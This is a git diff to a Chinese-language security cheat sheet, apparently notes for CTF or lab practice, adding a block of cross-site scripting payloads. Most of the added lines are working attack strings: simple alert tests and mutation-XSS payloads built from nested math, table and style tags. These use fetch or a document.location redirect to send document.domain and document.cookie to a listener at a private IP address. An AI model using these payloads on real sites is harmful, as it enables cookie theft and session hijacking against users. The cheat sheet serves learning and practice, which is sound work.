@@ -165,6 +165,21 @@ fetch(`/getflag\)
     fetch('http://<內網中我們開 PS 腳本的 IP>:8000/'+document.domain+'/'+Date.now())
     ```
 
+    以下有幾個好用的 Payload
+    ```js
+    # 簡單測試用
+    <a href="javascript:alert(1)">test</a>
+    </svgonclick=alert(1)>
+    <img src="x" onerror="alert(1)">
+
+    # 想要打到 Webhook ，可以值記看 Network 有沒有真的 request ，有時候會因為 http{s} 的原因而沒有送出
+    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('http://172.21.112.129:8000/123/'+document.domain+'/'+Date.now())>
+    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch(`https://172.21.112.129:8443/${document.domain}/${document.cookie}`)>
+
+    # 用 document.location 跳轉(跳轉不受 mixed content 限制)
+    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
+    ```
+
 #### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
 
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
